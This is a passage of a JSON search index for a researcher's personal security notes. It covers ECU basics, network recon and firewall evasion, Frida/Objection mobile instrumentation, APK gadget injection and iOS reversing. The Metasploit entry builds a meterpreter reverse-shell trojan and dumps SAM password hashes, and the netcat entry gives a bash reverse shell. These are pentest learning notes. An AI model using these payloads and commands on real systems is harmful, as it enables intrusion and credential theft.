        "tags": [],
        "content": " ECU tuning is a part of Calibration Changing some values to make a vehicle faster, have better accelaration etc. This calibration process is used to fine tune all parameters before final manufacturing process Usually XCP interface is removed from final production If XCP is open, you still need to reverse the firmware to understand the ECU  How to Calibrate and Adjust  Calibration Software Vehicle networks Interface to the ECU Calibration Protocol ECU description file (*.a2l)  How does it work  CCP (CAN Calibration Protocol) XCP (Universal Calibration Protocol)  Tools CANape\n", 
        "url": "https:\/\/duraki.github.io\/notes\/public\/ecu-calibration.html"
    },
    
    
    
    "https:\/\/duraki.github.io\/notes\/public\/ecu-foundations.html": {
        
        "title": "ECU Foundations",
        "tags": [],
        "content": "ECU  Electronic Control Unit the \u0026ldquo;ECU\u0026rdquo; Doing calculations or apply rules in the vehicle system  Calculation example of ECU Meassure \u0026ldquo;Speed (km/h)\u0026rdquo; ECU would \u0026ldquo;calculate\u0026rdquo;: - speed (km/h) = wheel (rpm) x 3.6   Apply a tiny part of logic  If speed is above 5km/h, then lock the doors   ECUs are wired to sensors, mothers, and other actuators One ECU can be used for different vehicles They use microcontroller (have memory/storage unlike microprocessor) Uses embedded software, via special hardware that converts electrical signal to numbers (and vice-versa), collectively IO (input/output) Uses networking hardware, via in-vehicle networks (like CANBus)  ECU Software Layers\n Control functions that ECU runs are referred to as \u0026ldquo;application software\u0026rdquo;, (ie window control, etc.) (ASW) Network connections of IO of ECU are managed via \u0026ldquo;basic software\u0026rdquo; (like an operating system layer) (BSW) Runtime environment \u0026ldquo;RTE\u0026rdquo; glues both Network and Control functions, takes output from ASW to BSW To update ECU software, we can use UDS and Flash Bootloader a special piece of ECU that updates the firmware  Diagnostis  OBD protocol (On Board Diagnostics) Use OBD to diagnose ECU\u0026rsquo;s Use XCP and Callibration to Diagnose ECU  HCP (New era of ECU\u0026rsquo;s)  There is new generation of ECU called high-performance computing platform (HCP)  ", 
        "url": "https:\/\/duraki.github.io\/notes\/public\/ecu-foundations.html"
    },
    
    
    
    "https:\/\/duraki.github.io\/notes\/public\/ethernet-specifications.html": {
        
        "title": "Ethernet Specifications",
        "tags": [],
        "content": "Specifications  SomeIP, Ethernet, IP Stack New standard 10BASE-T1S 10Mbit/s Half-duplex PLCA bus cycle - only specific PHY that can send data Physical Layer Collision Avoidance (PLCA) Avoid collision of data Multiple applications on single cable  ", 
        "url": "https:\/\/duraki.github.io\/notes\/public\/ethernet-specifications.html"
    },
    
    
    
    "https:\/\/duraki.github.io\/notes\/public\/firewall-engagements.html": {
        
        "title": "Firewall Engagements",
        "tags": [],
        "content": "Reconned from the start to finish in a few sec \u0026hellip;\nâ”Œâ”€â”€(kaliã‰¿kali)-[~] â””â”€$ ping x.x.x.x PING ??? 56(84) bytes of data. 64 bytes from ???: icmp_seq=1 ttl=52 time=64.4 ms 64 bytes from ???: icmp_seq=2 ttl=52 time=62.7 ms ^C --- ??? ping statistics --- 2 packets transmitted, 2 received, 0% packet loss, time 1002ms â”Œâ”€â”€(kaliã‰¿kali)-[~] â””â”€$ host x.x.x.x % nslookup \u0026gt; set type=PTR \u0026gt; x.x.x.x Server:\t???\tAddress: ???\tNon-authoritative answer: ... % whois x.x.x.x (example.ba) TCP Port Scan (Active)\n% sudo nmap -sS x.x.x.x PORT STATE SERVICE 8089/tcp open unknown UDP Port Scan\n% sudo nmap -sU --top-ports=100 x.x.x.x PORT STATE SERVICE 9/udp open|filtered discard 67/udp open|filtered dhcps Using masscan for rate allowance\n% sudo masscan 80.101.121.42 -p0-65535 --rate Scanning 1 hosts [65536 ports/host] Discovered open port 4433/tcp on x.x.x.x OS Detection\n% sudo nmap -O x.x.x.x Port Service detection\n% sudo nmap -sV -sS x.x.x.x -p $PORT PORT STATE SERVICE VERSION $PORT/tcp open http FRITZ!Box TR-069 service Enumerate HTTP Paths via nmap\n$ nmap -n -p80,4433,8080,8089,9443 --script http-enum x.x.x.x PORT STATE SERVICE 80/tcp closed http 4433/tcp open vop 8080/tcp closed http-proxy 8089/tcp open unknown 9443/tcp closed tungsten-https Certificate identification\n% nmap -sV --script ssl-cert-intaddr $SONICWALL -Pn -p4433,8089,80,9443,443 ... PORT STATE SERVICE VERSION 80/tcp filtered http 443/tcp filtered https 4433/tcp open ssl/http SonicWALL firewall http config |_http-server-header: SonicWALL | ssl-cert-intaddr: | Subject commonName: | 192.168.168.168 | Issuer commonName: |_ 192.168.168.168 8089/tcp open http FRITZ!Box TR-069 service 9443/tcp filtered tungsten-https Service Info: Devices: firewall, broadband router Active DNS Enumeration from the $ISP:\n% amass intel -active -addr x.x.x.x Firewalk Evasion\n% sudo nmap --script=firewalk --traceroute x.x.x.x ... PORT STATE SERVICE Host script results: | firewalk: | HOP HOST PROTOCOL BLOCKED PORTS TRACEROUTE (using port 443/tcp) HOP RTT ADDRESS 1 ... vhost discovery\n$ nmap -p4433,8089,80,9443 --script=\u0026#34;+http-vhosts\u0026#34; $SONICWALL -Pn PORT STATE SERVICE ... wafw00f implementation\n% wafw00f https://x.x.x.x:4433 -a -v ______ / \\ ( W00f! ) \\ ____/ ,, __ 404 Hack Not Found |`-.__ / / __ __ /\u0026#34; _/ /_/ \\ \\ / / *===* / \\ \\_/ / 405 Not Allowed / )__// \\ / /| / /---` 403 Forbidden \\\\/` \\ | / _ \\ `\\ /_\\\\_ 502 Bad Gateway / / \\ \\ 500 Internal Error `_____``-` /_/ \\_\\ ~ WAFW00F : v2.1.0 ~ The Web Application Firewall Fingerprinting Toolkit [*] Checking https://??? [+] The site https://??? is behind SonicWall (Dell) WAF. Other Technqs\n Phineas\u0026rsquo; Phisher VPN exploit Manual SQL Injection via binary patch diffing of vuln/non-vuln version Bruteforce Attack (Rate Limiter, Bypass) VPN or Firewall Version Disclosure Known Exploits and CVE\u0026rsquo;s Potential SQLmap payload  ", 
        "url": "https:\/\/duraki.github.io\/notes\/public\/firewall-engagements.html"
    },
    
    
    
    "https:\/\/duraki.github.io\/notes\/public\/frida-objection-tutorial.html": {
        
        "title": "Frida \u0026 Objection Tutorial",
        "tags": [],
        "content": "Android Tutorial Frida Setup Make sure to have Android Debugging interface running (adbd) on your testing device. For reference, read the adbd setup first and then continue here.\nInstall the Frida for Android:\n$ adb root # might be required $ adb push frida-server /data/local/tmp/ $ adb shell \u0026#34;chmod 755 /data/local/tmp/frida-server\u0026#34; $ adb shell \u0026#34;/data/local/tmp/frida-server \u0026amp;\u0026#34; Smoke test on Frida setup:\n$ adb devices -l $ frida-ps -U # PID NAME 1590 com.facebook.katana # 13194 com.facebook.katana:providers # 12326 com.facebook.orca # 13282 com.twitter.android ... adbd setup  Change all SELinux permissions to Permissable Use SELinuxPermission Android application, which checks for getenforce on a system reboot In MagiskManager application, enable the ADB Root When device is rebooting, USB debugging will not work out of the box SSH to Android device, using OpenSSHD In SSH shell type the following:  # =\u0026gt; On Android device (ssh) % su % whoami % adbd # =\u0026gt; On Attackers machine (duh) $ adb root $ adb shell (android) $ whoami # =\u0026gt; root iOS Tutorial Frida Setup  iOS connected over Wi-FI, Windows/Host connected to the same Wi-Fi, Linux/Guest connected to the same Wi-Fi Establish SSH connection to the iPhone (ssh root@x.x.x.x -p $PORT) SSH Auth combo (default): root:alpine Initiate a frida-server with remote connection listener In iOS device, open the application In a new Terminal, connect to Frida server  To create a new frida-server, first remove frida autoload script and start manually:\n# =\u0026gt; Unload iOS daemon $ launchctl unload -w /Library/LaunchDaemons/re.frida.server.plist # =\u0026gt; Start frida-server manually Testers-iPhone:/Applications root# frida-server -l x.x.x.x To establish a Frida REPL connection, use frida CLI:\nroot@kali:~# frida -H x.x.x.x -F ____ / _ | Frida 12.10.0 - A world-class dynamic instrumentation toolkit | (_| | \u0026gt; _ | Commands: /_/ |_| help -\u0026gt; Displays the help system . . . . object? -\u0026gt; Display information about \u0026#39;object\u0026#39; . . . . exit/quit -\u0026gt; Exit . . . . . . . . More info at https://www.frida.re/docs/home/ [Remote::AppName]-\u0026gt; Objection Setup First reference to Frida Setup to establish connection to the Frida server. Then use objection to investigate into the targeted application.\nroot@kali:~# objection -N -h 172.22.4.109 -g App explore Using networked device @`172.22.4.109:27042` Agent injected and responds ok! _ _ _ _ ___| |_|_|___ ___| |_|_|___ ___ | . | . | | -_| _| _| | . | | |___|___| |___|___|_| |_|___|_|_| |___|(object)inject(ion) v1.9.4 Runtime Mobile Exploration by: @leonjza from @sensepost [tab] for command suggestions x.xxxx.xxxxxxxx.xxxx on (iPhone: 13.3) [net] # Objection Usage\n$ env x.xxx.xxxxxxxxx.xxxx on (iPhone: 13.3) [net] # env\nName Path ----------------- ------------------------------------------------------------------------------------------- BundlePath /private/var/containers/Bundle/Application/DD6C2A3C-6CD3-44D0-9EAF-BC8EEE8C6702/App.app CachesDirectory /var/mobile/Containers/Data/Application/B26572F4-75BA-45C0-A6DE-40AEA275AF28/Library/Caches DocumentDirectory /var/mobile/Containers/Data/Application/B26572F4-75BA-45C0-A6DE-40AEA275AF28/Documents LibraryDirectory /var/mobile/Containers/Data/Application/B26572F4-75BA-45C0-A6DE-40AEA275AF28/Library  References\n Frida and Objection Objection Mobile Exploration Frida and Objection via x64.sh Objection/Frida Guide  ", 
        "url": "https:\/\/duraki.github.io\/notes\/public\/frida-objection-tutorial.html"
    },
    
    
    
    "https:\/\/duraki.github.io\/notes\/public\/frida-gadget-injection.html": {
        
        "title": "Frida Gadget Injection",
        "tags": [],
        "content": "This is quick description on how to inject Frida gadget into Smali directly without much overhead. Start by installing Frida and Objection and then continuing from here.\nFirst decompile the APK and check the AndroidManifest.xml file.\n$ more AndroidManifest.xml \u0026lt;application ...\u0026gt; \u0026lt;activity android:name=\u0026#34;xxx.activity.SplashActivity\u0026#34; android:noHistory=\u0026#34;true\u0026#34; android:screenOrientation=\u0026#34;portrait\u0026#34;\u0026gt; ... Write down the Activity name (such is SplashActivity). Must be somewhere on early start-up of application lifecycle. Open up the Activity in decompiled Smali object, and change the public constructor \u0026lt;init\u0026gt;(V) to include frida-gadget.\n$ vim xxx.activity.SplashActivity .class public Lcom/xxx/activity/SplashActivity; .source \u0026#34;SourceFile\u0026#34; # direct methods .method public constructor \u0026lt;init\u0026gt;()V .locals 0 .line 8 invoke-direct {p0}, Lcom/halcom/mobile/hybrid/activity/SplashActivity;-\u0026gt;\u0026lt;init\u0026gt;()V # =\u0026gt; injection point const-string v0, \u0026#34;frida-gadget\u0026#34; invoke-static {v0}, Ljava/lang/System;-\u0026gt;loadLibrary(Ljava/lang/String;)V return-void .end method Remember to inject this code in all of your public constructor \u0026lt;init\u0026gt;()V in Splash* activities. Move the application to your device and start it. Application has to handle libfrida-gadget.so correctly and load it at runtime. In Frida, it\u0026rsquo;s enought to type %resume in Frida REPL to continue execution after the injection.\n", 
        "url": "https:\/\/duraki.github.io\/notes\/public\/frida-gadget-injection.html"
    },
    
    
    
    "https:\/\/duraki.github.io\/notes\/public\/how-to-compromise-ecu.html": {
        
        "title": "How to compromise ECU",
        "tags": [],
        "content": "Five steps to compromise ECU:\n Remote access Access to in-vehicle network Bridge domain boundaries Access to target ECU Manipulate ECU or vehicle behavior  Find more info about Car Hacking on notes.\n", 
        "url": "https:\/\/duraki.github.io\/notes\/public\/how-to-compromise-ecu.html"
    },
    
    
    
    "https:\/\/duraki.github.io\/notes\/public\/how-to-write-notes.html": {
        
        "title": "How to write Notes",
        "tags": [],
        "content": "TL;DR  Use Markdown for everything Use shortcodes Clear and consistent Integrate well with art CLI  Shortcodes Caption images via this shortcode\n\u0026lt;span class=\u0026#34;caption-wrapper\u0026#34;\u0026gt; \u0026lt;img class=\u0026#34;caption\u0026#34; src=\u0026#34;/images/2016/thetheme/1.png\u0026#34; title=\u0026#34;Sample caption\u0026#34; alt=\u0026#34;Sample caption\u0026#34;\u0026gt; \u0026lt;span class=\u0026#34;caption-text\u0026#34;\u0026gt;Sample caption\u0026lt;/span\u0026gt; \u0026lt;/span\u0026gt; {{ \u0026lt; imgcap title=\u0026#34;Sample caption\u0026#34; src=\u0026#34;/images/2016/thetheme/1.png\u0026#34; \u0026gt; }} Insert Gist via this line\n{{ \u0026lt; gist duraki 78985452 \u0026gt; }} Include Instagram image in the note\n# =\u0026gt; https://www.instagram.com/p/BWNjjyYFxVx/ # =\u0026gt; Normal Instagram view {{ \u0026lt; instagram BWNjjyYFxVx \u0026gt; }} # =\u0026gt; Hide caption {{ \u0026lt; instagram BWNjjyYFxVx hidecaption \u0026gt; }} Include Tweet in the note\n# =\u0026gt; https://twitter.com/SanDiegoZoo/status/1453110110599868418 {{ \u0026lt; tweet user=\u0026#34;SanDiegoZoo\u0026#34; id=\u0026#34;1453110110599868418\u0026#34; \u0026gt; }} More shortcodes on official website.\nDeploy To deploy localy, use any server and a generator\n# =\u0026gt; build $ ruby art notes local # =\u0026gt; for local environment $ ruby art notes hybrid # =\u0026gt; for prod environment # =\u0026gt; serve $ php -S 127.0.0.1:8800 # =\u0026gt; in $REPO_ROOT directory ", 
        "url": "https:\/\/duraki.github.io\/notes\/public\/how-to-write-notes.html"
    },
    
    
    
    "https:\/\/duraki.github.io\/notes\/public\/ios-reverse-engineering.html": {
        
        "title": "iOS Reverse Engineering",
        "tags": [],
        "content": "Using class-dump\n$ class-dump -S -s -H App -o /path/to/headers/App/  Frida \u0026amp; Objection Tutorial LLDB Pure Reverse Engineering Cycript Decrypt IPA from AppStore iOS Jailbreak Bypass iOS Static Analysis  References\n iOS CheatSheet Decrypting apps from AppStore Reverse Engineering Tools iOS Static Analysis  ", 
        "url": "https:\/\/duraki.github.io\/notes\/public\/ios-reverse-engineering.html"
    },
    
    
    
    "https:\/\/duraki.github.io\/notes\/public\/ios-static-analysis.html": {
        
        "title": "iOS Static Analysis",
        "tags": [],
        "content": " Find all JSON and Plist files in app bundle and see if there are any disclosures NSAllowsArbitraryLoads - Disables App Transport Security (ATS), allowing weak TLS configs CFBundleURLTypes - Custom Scheme URLs that can be exploited further (see this) AFNetworking 2.5.1 - Version and below are vulnerable to MITM if there was no SSL pinning applied  ", 
        "url": "https:\/\/duraki.github.io\/notes\/public\/ios-static-analysis.html"
    },
    
    
    
    "https:\/\/duraki.github.io\/notes\/public\/jailbreak-bypass.html": {
        
        "title": "Jailbreak Bypass",
        "tags": [],
        "content": "If jailbreak detection persists in iOS application, try these tricks:\n Libery Lite via Cydia, then go to settings, and then select the application Recommended Objection use ios jailbreak disable or --startup-command Frida as a standalone instrumentation Manual Patching, the old school way  ", 
        "url": "https:\/\/duraki.github.io\/notes\/public\/jailbreak-bypass.html"
    },
    
    
    
    "https:\/\/duraki.github.io\/notes\/public\/linux-notes.html": {
        
        "title": "Linux Notes",
        "tags": [],
        "content": "Active Directory\nAccess Active Directory Domain Admin via Linux:\n$ sudo apt-get realmd $ realm join example.ba --user username ", 
        "url": "https:\/\/duraki.github.io\/notes\/public\/linux-notes.html"
    },
    
    
    
    "https:\/\/duraki.github.io\/notes\/public\/list-of-tools.html": {
        
        "title": "List of Tools",
        "tags": [],
        "content": "apktool, android, openssl\n", 
        "url": "https:\/\/duraki.github.io\/notes\/public\/list-of-tools.html"
    },
    
    
    
    "https:\/\/duraki.github.io\/notes\/public\/list-of-topics.html": {
        
        "title": "List of Topics",
        "tags": [],
        "content": "Personal list of topics of interest. At least for me eh? :)\nAutomotive Cyber Security  Automotive Hacking Ethernet in Vehicles CANFD Specifications ECU Foundation ECU Calibration ECU Compromise Vehicle Graybox Security Testing Vehicle Hacking Environment  Classical Penetration Testing  OSINT Web Pentest Oneliners Web Fuzzing SQL Injection Payloads Cloud Metadata XSS Payloads Captcha Bypass 403 Bypass Virtual Host Enumeration API Abuse Checklists  REST API Issue Library Web Issue Library PHP Source Code Analysis  PHP Filesystem Functions     Networking  Basic Network Recon Firewall Penetration Test Wifi Cracking via Aircrack GSN3 Lab Environment Metasploit Framework Server Anywhere Netcat Tricks    Reverse Engineering  Tricks and Tips WinDbg Cheatsheets Byteman Cheatsheets Byteman Scripts iOS Reverse Engineering  Frida \u0026amp; Objection Tutorial Pure Reverse Engineering LLDB Cycript Decrypt IPA from AppStore iOS Jailbreak Bypass iOS Static Analysis   Android Reverse Engineering  Frida \u0026amp; Objection Tutorial Frida Gadget Injection on Android Android Recompilation   OPCRouter Research  Development blog\nMockup for my minimal blog and notes publishing app called art (visible in blog setup).\n todo: vim.init, tmux, iterm, osx todo: gmmk + key remap todo: photos/ physical Bash  Misc  Windows Notes Linux Notes MacOS Notes How to write Notes Troubleshoot ~ ideas  ", 
        "url": "https:\/\/duraki.github.io\/notes\/public\/list-of-topics.html"
    },
    
    
    
    "https:\/\/duraki.github.io\/notes\/public\/lldb.html": {
        
        "title": "lldb",
        "tags": [],
        "content": "Attach Failed Not allowed to attach to process:\n(lldb) process attach --pid 76371 (# =\u0026gt; or by Name) error: attach failed: attach failed (Not allowed to attach to process. Look in the console messages (Console.app), near the debugserver entries, when the attach failed. The subsystem that denied the attach permission will likely have logged an informative message about why it was denied.) Solution:\n$ cat /tmp/debug_entitlements.plist \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;!DOCTYPE plist PUBLIC \u0026#34;-//Apple//DTD PLIST 1.0//EN\u0026#34; \u0026#34;http://www.apple.com/DTDs/PropertyList-1.0.dtd\u0026#34;\u0026gt; \u0026lt;plist version=\u0026#34;1.0\u0026#34;\u0026gt; \u0026lt;dict\u0026gt; \u0026lt;key\u0026gt;com.apple.security-get-task-allow\u0026lt;/key\u0026gt; \u0026lt;true/\u0026gt; \u0026lt;key\u0026gt;com.apple.security.cs.disable-library-validation\u0026lt;/key\u0026gt; \u0026lt;true/\u0026gt; \u0026lt;key\u0026gt;com.apple.security.device.audio-input\u0026lt;/key\u0026gt; \u0026lt;true/\u0026gt; \u0026lt;/dict\u0026gt; \u0026lt;/plist\u0026gt; $ codesign --force --options runtime --sign - --entitlements /tmp/debug_entitlements.plist /Apps/MyApp.app Terminated due to code signing error Happens when codesign is not put in place. Need to codesign a Macho binary:\n(lldb) process attach --pid 76371 (# =\u0026gt; or by Name) Process 8873 exited with status = 9 (0x00000009) Terminated due to code signing error Solution:\n# =\u0026gt; Create a new Code Signing certificate in Keychain Access, then ... $ codesign --deep --force -s \u0026#34;signature\u0026#34; /Apps/MyApp.app ", 
        "url": "https:\/\/duraki.github.io\/notes\/public\/lldb.html"
    },
    
    
    
    "https:\/\/duraki.github.io\/notes\/public\/macos-notes.html": {
        
        "title": "MacOS Notes",
        "tags": [],
        "content": "Check Application entitlement\n# ~\u0026gt; brew install jtool # =\u0026gt; no visible entitlemens $ jtool --ent /Applications/MachOView.app /Applications/MachOView.app/Contents/MacOS//MachOView apparently does not contain any entitlements # =\u0026gt; with visible entitlements $ jtool --ent /Applications/ProtonVPN.app \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;!DOCTYPE plist PUBLIC \u0026#34;-//Apple//DTD PLIST 1.0//EN\u0026#34; \u0026#34;http://www.apple.com/DTDs/PropertyList-1.0.dtd\u0026#34;\u0026gt; \u0026lt;plist version=\u0026#34;1.0\u0026#34;\u0026gt; \u0026lt;dict\u0026gt; \u0026lt;key\u0026gt;com.apple.application-identifier\u0026lt;/key\u0026gt; \u0026lt;string\u0026gt;J6S6Q257EK.ch.protonvpn.mac\u0026lt;/string\u0026gt; \u0026lt;key\u0026gt;com.apple.developer.maps\u0026lt;/key\u0026gt; \u0026lt;true/\u0026gt; ... libSystem.B.dylib\nAll API rely on above library. For example, when the MachO Process starts, the above library will be loaded early in time so it can use other APIs.\n", 
        "url": "https:\/\/duraki.github.io\/notes\/public\/macos-notes.html"
    },
    
    
    
    "https:\/\/duraki.github.io\/notes\/public\/metasploit-framework.html": {
        
        "title": "Metasploit Framework",
        "tags": [],
        "content": "Create executable trojan\n$ msfvenom -p windows/meterpreter/reverse_tcp -a x86 -f exe LHOST=192.168.153.128 LPORT=8888 -o /root/Desktop/dolphin.exe On Attackers machine (Starting Session)\n$ msfconsole ... [loaded] msf5 exploit(multi/handler) \u0026gt; use multi/handler msf5 exploit(multi/handler) \u0026gt; set payload windows/meterpreter/reverse_tcp payload =\u0026gt; windows/meterpreter/reverse_tcp msf5 exploit(multi/handler) \u0026gt; show options Module options (exploit/multi/handler): Name Current Setting Required Description ---- --------------- -------- ----------- Payload options (windows/meterpreter/reverse_tcp): Name Current Setting Required Description ---- --------------- -------- ----------- EXITFUNC process yes Exit technique (Accepted: \u0026#39;\u0026#39;, seh, thread, process, none) LHOST yes The listen address (an interface may be specified) LPORT 4444 yes The listen port Exploit target: Id Name -- ---- 0 Wildcard Target msf5 exploit(multi/handler) \u0026gt; set LHOST 192.168.153.128 LHOST =\u0026gt; 192.168.153.128 msf5 exploit(multi/handler) \u0026gt; set LPORT 8888 LPORT =\u0026gt; 8888 msf5 exploit(multi/handler) \u0026gt; run [*] Started reverse TCP handler on 192.168.153.128:8888 [*] Sending stage (179779 bytes) to 192.168.153.133 [*] Meterpreter session 1 opened (192.168.153.128:8888 -\u0026gt; 192.168.153.133:49915) at 2020-06-21 11:27:30 +0200 meterpreter \u0026gt; ls Listing: C:\\trojan ================== Mode Size Type Last modified Name ---- ---- ---- ------------- ---- 100777/rwxrwxrwx 73802 fil 2020-06-21 11:27:13 +0200 dolphin.exe Common Commands\nGet SYSTEM shell\n$ meterpreter \u0026gt; getsystem ...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)). $ getuid SYSTEM\\* Get available privileges\n$ meterpreter \u0026gt; getprivs Enabled Process Privileges Name: SeBackupPrivilege SeChangeNotifyPrivilege SeCreateGlobalPrivilege SeCreatePagefilePrivilege SeCreateSymbolicLinkPrivilege SeDebugPrivilege SeImpersonatePrivilege SeIncreaseBasePriorityPrivilege SeIncreaseQuotaPrivilege SeIncreaseWorkingSetPrivilege SeLoadDriverPrivilege SeManageVolumePrivilege SeProfileSingleProcessPrivilege SeRemoteShutdownPrivilege SeRestorePrivilege SeSecurityPrivilege SeShutdownPrivilege SeSystemEnvironmentPrivilege SeSystemProfilePrivilege SeSystemtimePrivilege SeTakeOwnershipPrivilege SeTimeZonePrivilege SeUndockPrivilege Dump hashes\n$ meterpreter \u0026gt; hashdump **--\u0026gt; usually error, we can use kiwi (load kiwi) or mimikatz (load mimikatz) View Kiwi or Hashdump\n## =\u0026gt; kiwi method $ load kiwi $ meterpreter \u0026gt; lsa_dump_sam [+] Running as SYSTEM [*] Dumping SAM Domain : SUPERASME SysKey : 2191beee37c928bbf9e2de8f685b5227 Local SID : S-1-5-21-716707718-802779726-1162805411 SAMKey : 3d3b9a321a53397e7082da89be862a1e RID : 000001f4 (500) User : Administrator RID : 000001f5 (501) User : Guest RID : 000001f7 (503) User : DefaultAccount RID : 000001f8 (504) User : WDAGUtilityAccount Hash NTLM: dfa827b88238ba5def8e431fe9503a34 RID : 000003e9 (1001) User : Asmir Hadzic Hash NTLM: ed2ae0d1f7e22ca3187d8e8d91d968c7 ## =\u0026gt; hashdump method meterpreter \u0026gt; run post/windows/gather/hashdump [*] Obtaining the boot key... [*] Calculating the hboot key using SYSKEY 2191beee37c928bbf9e2de8f685b5227... [*] Obtaining the user list and keys... [*] Decrypting user keys... [*] Dumping password hints... No users with password hints on this system [*] Dumping password hashes... Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:dfa827b88238ba5def8e431fe9503a34::: Asmir Hadzic:1001:aad3b435b51404eeaad3b435b51404ee:ed2ae0d1f7e22ca3187d8e8d91d968c7::: Other Commands\nMeterpreter consists of a large number of commands which are categorized in their respective categories, namely:\n Core Commands STDapi : File Commands STDapi : Networking Commands STDapi : File- System Commands STDapi : User Interface Commands STDapi : Web Cam Commands Priv : Elevate Commands Priv : Password database Commands Priv : Time Stomp commands  ", 
        "url": "https:\/\/duraki.github.io\/notes\/public\/metasploit-framework.html"
    },
    
    
    
    "https:\/\/duraki.github.io\/notes\/public\/netcat-tricks.html": {
        
        "title": "netcat tricks",
        "tags": [],
        "content": "Basic use of Netcat + CentOS Firewall Rules For direct reverse shell:\n|attacker machine|\u0026lt;------\u0026gt;|victim machine| On \u0026ldquo;attackers machine\u0026rdquo; (vps, infra, blackhole), drop all iptables rules (dirty), and setup a connection listener:\n$ sudo iptables -F $ sudo ncat -nlvp 9999 On \u0026ldquo;victim machine\u0026rdquo; (target), connect to netcat listener:\n$ ncat x.x.x.x 9999 -e /bin/bash You should have a working remote shell n0w.\nFor probe direct reverse shell:\n|attacker machine|\u0026lt;------\u0026gt;|attacker box|\u0026lt;-------\u0026gt;|victime machine| On \u0026ldquo;attackers box\u0026rdquo; (blackhole and/or owned boxes), drop all iptables rules (dirty), and setup a connection broker.\n$ sudo iptables -F # =\u0026gt; important! $ sudo ncat --broker 9999 # =\u0026gt; creates a broker for probing On \u0026ldquo;attackers machine\u0026rdquo; (see above):\n$ sudo ncat [attacker box] 9999 On \u0026ldquo;victim machine\u0026rdquo;:\n$ sudo ncat ", 
        "url": "https:\/\/duraki.github.io\/notes\/public\/netcat-tricks.html"
    },
    
    
    
    "https:\/\/duraki.github.io\/notes\/public\/network-lab.html": {
        
        "title": "Network Lab",
        "tags": [],
        "content": "Simple Topology In GSN3, add 2 VPCS and 2 Cisco routers. Start VPCS and enter Console mode. Append IPv4 address for the interface.\n# sets ipv4; netmask and gw for the vpc PC1\u0026gt; ip 192.168.0.10/24 192.168.0.1 Checking for duplicate address... PC1 : 192.168.0.10 255.255.255.0 gateway 192.168.0.1 # ... same for the 2nd vpc with different static ip # PC2\u0026gt; ip 192.168.0.11/24 192.168.0.1 Always save the configuration of the assets with save command:\nPC1\u0026gt; save Saving startup configuration to startup.vpc . done Advanced Topology Corporate Topology SCADA Topology ", 
        "url": "https:\/\/duraki.github.io\/notes\/public\/network-lab.html"
    },
    
    
    
    "https:\/\/duraki.github.io\/notes\/public\/network-recon.html": {
        
        "title": "Network Recon",
        "tags": [],
        "content": "External Network Engagement nmap oneliners (do-it-all) + fw evasion\n$ nmap -Pn -vvv -sC --script=firewalk -p1-65535 -D RND:10 \u0026lt;target\u0026gt; basic recon\n$ nslookup set type=NS x.x.x.x basic nmap\n$ sudo nmap -sS 80.101.121.42 # syn scan first $ sudo nmap -O 80.101.121.42 # os detection $ sudo nmap -sV -sS 80.101.121.42 -p 8089 # service detection $ nc 80.101.121.42 8089 # try connecting via detected ports basic masscan\n$ sudo masscan 80.101.121.42 -p0-65535 --rate 10000 -eutun2 # =\u0026gt; via vpn tunnel (tun2) $ sudo masscan 80.101.121.42 -p0-65535 --rate 10000 # =\u0026gt; default eth nmap exoitc firewall evasion rules\n Bypassing Firewall Rules  ping gateway ipv4 address\n$ nmap -sn -v -PE 192.168.*.1 dns enumeration\n$ dig â€“t any example.ba revere DNS lookup\n$ sudo nmap -sL x.x.x.x identity alive ipv4\n$ sudo nmap-sn-n x.x.x.x asn/bgp extractoion\n BGP View BGP.he.net  reverse ip domain lookup\n Domainstools  zoomeye search\n zoomeye  additional nmap scripts\n# =\u0026gt; Basic Recon nmap -n p80,\u0026lt;port\u0026gt;,... --script http-enum x.x.x.x nmap -v --script dos x.x.x.x sudo nmap -v --script vuln x.x.x.x nmap -n -p --script dns-brute x.x.x.x # =\u0026gt; Vuln scan nmap -sV --script=vulners x.x.x.x sudo nmap -sV -Pn -p4000-4433,8000-8089,80-443,9000-9443 --script=vulscan/vulscan x.x.x.x firewall evasion\n Firewall Penetration Test  # =\u0026gt; Firewall Hopping $ nmap --script=firewalk --traceroute x.x.x.x # =\u0026gt; Firewall Vulnerability Scanning $ nmap --script nmap-vulners,vulscan --script-args vulscandb=scipvuldb.csv -sV -p$PORT x.x.x.x run specific nmap scripts on specific port\nâ”Œâ”€â”€(kaliã‰¿kali)-[/usr/share/nmap/scripts] â””â”€$ sudo nmap --script \u0026#34;+http-*\u0026#34; x.x.x.x -p4433,8089,80,9443 discover vhost on the target\n Virtual Host Enumeration  $ nmap -p4433,8089,80,9443 --script=\u0026#34;+http-vhosts\u0026#34; x.x.x.x -Pn PUT directly to server\n$ nmap -p 4433,8089 x.x.x.x --script http-put --script-args http-put.url=\u0026#39;/\u0026#39;,http-put.file=\u0026#39;fileput.txt\u0026#39; -Pn detecet WAF\n$ nmap --script=http-waf-fingerprint --script-args http-waf-fingerprint.intensive=1 x.x.x.x -Pn --top-ports=100 SSL scan\n$ nmap -sV --script ssl-dh-params x.x.x.x -Pn -p4433,8089,80,9443,443 heartbleed scan\n$ nmap -sV --script ssl-heartbleed x.x.x.x -Pn -p4433,8089,80,9443,443 known SSL keys\n$ nmap -sV --script ssl-known-key x.x.x.x -Pn -p4433,8089,80,9443,443 check for POODLE\n$ nmap -sV --version-light --script ssl-poodle -p4433,8089,80,9443,443 x.x.x.x -Pn check for SSLv2 DROWN\n$ nmap -sV --script=sslv2-drown -p4433,8089,80,9443,443 x.x.x.x -Pn try banner grabbing\n$ nc -nvv x.x.x.x 4433 (UNKNOWN) [???] 4433 (?) open try dumping pcap files\n$ sudo tcpdump -ttttnnr tcp_dump.pcap tcpdump -qns 0 -A -r blah.pcap ", 
        "url": "https:\/\/duraki.github.io\/notes\/public\/network-recon.html"
    },
    
    
    
    "https:\/\/duraki.github.io\/notes\/public\/opcrouter-research.html": {
        
        "title": "OPCRouter Research",
        "tags": [],
